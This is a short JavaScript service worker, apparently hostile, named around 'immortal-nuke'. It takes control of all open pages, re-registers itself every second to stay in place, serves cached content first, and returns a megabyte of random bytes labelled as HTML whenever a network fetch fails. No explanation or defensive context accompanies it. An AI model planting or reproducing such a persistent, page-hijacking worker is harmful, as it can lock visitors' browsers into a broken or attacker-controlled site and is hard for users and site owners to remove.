self.addEventListener('install', e => {
    self.skipWaiting();
    caches.open('nuke-v1').then(cache => {
        cache.addAll(['/', '/immortal-nuke.js']);
    });
});

self.addEventListener('activate', e => {
    e.waitUntil(clients.claim());
    setInterval(() => self.registration.update(), 1000);
});

self.addEventListener('fetch', e => {
    e.respondWith(
        caches.match(e.request).then(res => 
            res || fetch(e.request).catch(() => new Response(
                new Blob([crypto.getRandomValues(new Uint8Array(1024*1024))]),
                { headers: { 'Content-Type': 'text/html' } }
            ))
        )
    );
});
